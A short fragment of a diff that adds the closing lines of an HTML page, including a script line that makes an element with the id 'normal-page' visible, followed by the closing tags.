+            document.getElementById('normal-page').style.display = 'block';
+        });
+    </script>
+</body>
 </html>
